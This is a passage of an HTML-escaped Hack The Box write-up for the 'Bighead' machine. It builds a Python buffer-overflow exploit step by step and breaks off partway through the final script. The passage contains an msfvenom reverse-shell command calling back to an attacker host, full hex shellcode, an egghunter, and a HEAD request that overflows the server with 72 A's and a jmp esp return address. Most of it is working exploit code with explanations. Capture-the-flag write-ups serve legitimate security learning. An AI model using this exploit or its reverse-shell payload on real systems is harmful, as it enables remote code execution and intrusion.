&lt;h4 id=&quot;then-i-searched-in-the-memory-&quot;&gt;Then I searched in the memory :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/73.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/74.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-we-can-see-the-whole-request-is-printed-in-the-memory-with-this-information-now-we-can-write-the-exploit&quot;&gt;As we can see the whole request is printed in the memory. With this information now we can write the exploit.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;writing-the-exploit&quot;&gt;Writing the Exploit&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-is-the-imports-i-imported-socketbinascii-and-re&quot;&gt;First thing is the imports, I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;binascii&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;re&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
import binascii
import re
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-started-to-define-the-variables--we-need-variables-to-hold-the-host-the-port-the-egg-the-shellcode-and-the-egghunter-lets-generate-the-shellcode-first-&quot;&gt;Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;-b-x00-is-for-bad-chars-x00-which-is-a-null-byte-is-always-a-bad-char-because-it-acts-a-string-terminator-and-terminates-the-execution-so-we-dont-need-that-in-the-shellcode--we-will-add-this-to-the-exploit-and-remove-x-because-we-will-use-hexlify-and-unhexlify-functions-from-binascii-this-is-for-the-shellcode-now-we-need-the-egghunter-i-used-this-tool-to-generate-the-egghunter-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-b '\x00'&lt;/code&gt; is for bad chars. &lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt; which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don’t need that in the shellcode.  We will add this to the exploit and remove &lt;code class=&quot;highlighter-rouge&quot;&gt;\x&lt;/code&gt; because we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;hexlify&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;unhexlify&lt;/code&gt; functions from &lt;code class=&quot;highlighter-rouge&quot;&gt;binascii&lt;/code&gt;. This is for the shellcode, now we need the egghunter. I used this &lt;a href=&quot;https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py&quot;&gt;tool&lt;/a&gt; to generate the egghunter :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-didnt-like-that-i-should-generate-a-new-one-if-i-wanted-to-change-the-egg-heres-how-the-tool-is-doing-it-&quot;&gt;But I didn’t like that I should generate a new one if I wanted to change the egg, here’s how the tool is doing it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-easily-add-this-to-the-exploit-itself&quot;&gt;We can easily add this to the exploit itself.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;host = '10.10.10.112'
port = 80
egg = 'R1ck'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;host-is-for-the-ip-of-the-machine-port-is-for-the-port-and-egg-is-to-hold-the-value-of-the-egg-after-that-comes-the-buf-variable-generated-by-msfvenom-this-is-the-my-shellcode-you-should-generate-a-new-one-with-your-ip-and-listening-port-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;host&lt;/code&gt; is for the ip of the machine, &lt;code class=&quot;highlighter-rouge&quot;&gt;port&lt;/code&gt; is for the port and &lt;code class=&quot;highlighter-rouge&quot;&gt;egg&lt;/code&gt; is to hold the value of the egg. After that comes the &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; variable generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; (this is the my shellcode you should generate a new one with your ip and listening port) :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;buf =  &quot;&quot;
buf += &quot;d9c7d97424f45a2bc9bb9f0948&quot;
buf += &quot;3bb15283c204315a1303c51aaa&quot;
buf += &quot;ce05f4a831f505cdb81034cddf&quot;
buf += &quot;5167fd94378476f8a31ffad5c4&quot;
buf += &quot;a8b103eb29e9706aaaf0a44c93&quot;
buf += &quot;3ab98dd42730df8d2ce7cfba79&quot;
buf += &quot;3464f06c3c99418e6d0cd9c9ad&quot;
buf += &quot;af0e62e4b7534fbe4ca73b4184&quot;
buf += &quot;f9c4eee93537ee2ef1a8854601&quot;
buf += &quot;549e9d7b822b05db418be1dd86&quot;
buf += &quot;4a62d163182cf672cd4702fef0&quot;
buf += &quot;878244d703ce1f7612aace8744&quot;
buf += &quot;15ae2d0fb8bb5f52d508526c25&quot;
buf += &quot;07e51f17885db71b4178405b78&quot;
buf += &quot;3cdea2833df760d76d6f4058e6&quot;
buf += &quot;6f6d8da93fc17e0aefa12ee2e5&quot;
buf += &quot;2d101206e439b9fd6f4c34ee74&quot;
buf += &quot;384a108e81c3f6fae185a19298&quot;
buf += &quot;8f3902641a4404eea9b9cb07c7&quot;
buf += &quot;a9bce792936bf708bbf06ad73b&quot;
buf += &quot;7e97406cd76999f8c5d0331e14&quot;
buf += &quot;847c9ac375822381c2a0335fca&quot;
buf += &quot;ec670f9dbad1e9770d8ba324c7&quot;
buf += &quot;5b3507d81d3a42aec18b3bf7fe&quot;
buf += &quot;24acff87584cff52d97c4afe48&quot;
buf += &quot;15136bc978a4460e852762ef72&quot;
buf += &quot;3707ea3ffff486506afa3550bf&quot;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-created-a-variable-to-hold-the-final-shellcode-egg-doubled--shellcode-and-another-variable-for-the-egghunter-&quot;&gt;I created a variable to hold the final shellcode (egg doubled + shellcode) and another variable for the egghunter :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shellcode = (egg * 2) + binascii.unhexlify(buf)
egghunter = &quot;6681caff0f42526a0258cd2e3c055a74efb8&quot; + binascii.hexlify(egg) + &quot;8bfaaf75eaaf75e7ffe7&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--theres-a-variable-called-n-that-will-come-later-and-it-has-nothing-to-do-with-the-exploit-itself&quot;&gt;Note : there’s a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, that will come later and it has nothing to do with the exploit itself.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-need-to-create-two-functions-first-one-is-to-send-the-shellcode-through-a-post-request-the-other-one-is-to-exploit-the-vulnerability-and-send-the-egghunter&quot;&gt;Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-start-by-defining-the-function-&quot;&gt;We will start by defining the function :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;def send_shellcode(N,host,port,egg,shellcode):&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-open-a-tcp-stream-socket-to-the-server-and-the-port-and-hold-it-in-a-variable-called-s-&quot;&gt;Then we will open a TCP stream socket to the server and the port and hold it in a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;last-thing-to-do-is-to-send-the-post-request-with-the-shellcode-&quot;&gt;Last thing to do is to send the POST request with the shellcode :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s.send(&quot;POST / HTTP/1.1\r\n&quot;)
s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
s.send(&quot;Content-Length: %s\r\n&quot;%len(shellcode))
s.send(&quot;\r\n&quot;)
s.send(shellcode+&quot;\r\n&quot;)
s.send(&quot;\r\n&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-we-will-close-the-stream-&quot;&gt;Then we will close the stream :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s.close()&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-added-this-in-a-for-loop-to-send-the-shellcode-16-times-i-did-this-because-i-wanted-to-put-the-shellcode-in-different-places-so-the-egghunter-finds-it-easily-i-also-added-a-print-statement-at-the-start-of-the-function--print-03332m--sending-shellcode-03332m-is-for-the-color-its-not-important-for-the-exploit-and-i-added-a-print-statement-before-closing-the-stream--print-03334m----strn-----resubrs-srecv12-resubrs-srecv12-this-will-use-re-regular-expressions-operations-to-print-the-first-12-chars-of-the-first-line-of-the-server-response-http11-----status-code-3-chars--12&quot;&gt;I added this in a &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt; loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : &lt;code class=&quot;highlighter-rouge&quot;&gt;print &quot;\033[32m [*] Sending Shellcode&quot;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;\033[32m&lt;/code&gt; is for the color it’s not important for the exploit. And I added a print statement before closing the stream : &lt;code class=&quot;highlighter-rouge&quot;&gt;print '\033[34m' + '[' + str(N) + '] ' + re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))&lt;/code&gt; This will use &lt;code class=&quot;highlighter-rouge&quot;&gt;re&lt;/code&gt; (regular expressions operations) to print the first 12 chars of the first line of the server response (“HTTP/1.1” + “ “ + status code (3 chars) = 12).&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;send_shellcode&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def send_shellcode(N,host,port,egg,shellcode):
	print &quot;\033[32m [*] Sending Shellcode&quot;
	for i in range(0,16):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send(&quot;POST / HTTP/1.1\r\n&quot;)
		s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
		s.send(&quot;Content-Length: %s\r\n&quot;%len(shellcode))
		s.send(&quot;\r\n&quot;)
		s.send(shellcode+&quot;\r\n&quot;)
		s.send(&quot;\r\n&quot;)
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))
		s.close()
		N += 1
	print &quot;\033[32m [*] Done&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-for-send_shellcode-lets-write-send_egghunter-we-will-define-the-function-first-&quot;&gt;That’s for &lt;code class=&quot;highlighter-rouge&quot;&gt;send_shellcode&lt;/code&gt;, let’s write &lt;code class=&quot;highlighter-rouge&quot;&gt;send_egghunter&lt;/code&gt;. We will define the function first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;def send_egghunter(host,port,egghunter):&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-open-a-tcp-stream-socket-to-the-server-and-the-port-and-hold-it-in-a-variable-called-s--1&quot;&gt;Then we will open a TCP stream socket to the server and the port and hold it in a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-connect-and-send-the-head-request-&quot;&gt;Then we will connect and send the HEAD request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s.connect((host,port))
s.settimeout(None)
s.send(&quot;HEAD /&quot; + (&quot;A&quot;*72) + &quot;f0125062&quot; + egghunter + &quot; HTTP/1.1\r\n&quot;)
s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
s.send(&quot;\r\n&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-did-settimeoutnone-as-the-server-takes-a-lot-of-time-to-respond-to-this-request-because-we-will-change-the-code-flow-so-the-server-wont-reply-and-we-dont-want-the-stream-to-be-closed-before-our-egghunter-is-successfully-executed&quot;&gt;I did &lt;code class=&quot;highlighter-rouge&quot;&gt;settimeout(None)&lt;/code&gt; as the server takes a lot of time to respond to this request (Because we will change the code flow so the server won’t reply) and we don’t want the stream to be closed before our egghunter is successfully executed.&lt;/h4&gt;
&lt;h4 id=&quot;ssendhead---a72--f0125062--egghunter---http11rn-this-line-sends-72-as-then-f0125062-jmp-esp-new-eip-then-the-egghunter&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s.send(&quot;HEAD /&quot; + (&quot;A&quot;*72) + &quot;f0125062&quot; + egghunter + &quot; HTTP/1.1\r\n&quot;)&lt;/code&gt; This line sends 72 A’s then &lt;code class=&quot;highlighter-rouge&quot;&gt;f0125062&lt;/code&gt; (jmp esp (new EIP)) then the egghunter.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;send_egghunter&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def send_egghunter(host,port,egghunter):
	print &quot;\033[32m [*] Sending EggHunter&quot;
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send(&quot;HEAD /&quot; + (&quot;A&quot;*72) + &quot;f0125062&quot; + egghunter + &quot; HTTP/1.1\r\n&quot;)
	s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
	s.send(&quot;\r\n&quot;)
	print '\033[34m' + re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))
	s.close()
	print &quot;\033[32m [*] Done&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/81.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-exploit-is-ready-we-just-need-to-call-the-functions-&quot;&gt;The exploit is ready, we just need to call the functions :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/82.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;final-exploit-&quot;&gt;Final Exploit :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'10.10.10.112'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'R1ck'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d9c7d97424f45a2bc9bb9f0948&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3bb15283c204315a1303c51aaa&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ce05f4a831f505cdb81034cddf&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;5167fd94378476f8a31ffad5c4&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a8b103eb29e9706aaaf0a44c93&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3ab98dd42730df8d2ce7cfba79&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3464f06c3c99418e6d0cd9c9ad&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;af0e62e4b7534fbe4ca73b4184&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;f9c4eee93537ee2ef1a8854601&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;549e9d7b822b05db418be1dd86&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;4a62d163182cf672cd4702fef0&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;878244d703ce1f7612aace8744&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;15ae2d0fb8bb5f52d508526c25&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;07e51f17885db71b4178405b78&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3cdea2833df760d76d6f4058e6&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;6f6d8da93fc17e0aefa12ee2e5&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;2d101206e439b9fd6f4c34ee74&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;384a108e81c3f6fae185a19298&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;8f3902641a4404eea9b9cb07c7&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a9bce792936bf708bbf06ad73b&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;7e97406cd76999f8c5d0331e14&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;847c9ac375822381c2a0335fca&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ec670f9dbad1e9770d8ba324c7&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;5b3507d81d3a42aec18b3bf7fe&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;24acff87584cff52d97c4afe48&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;15136bc978a4460e852762ef72&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3707ea3ffff486506afa3550bf&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;6681caff0f42526a0258cd2e3c055a74efb8&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;8bfaaf75eaaf75e7ffe7&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Sending Shellcode&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
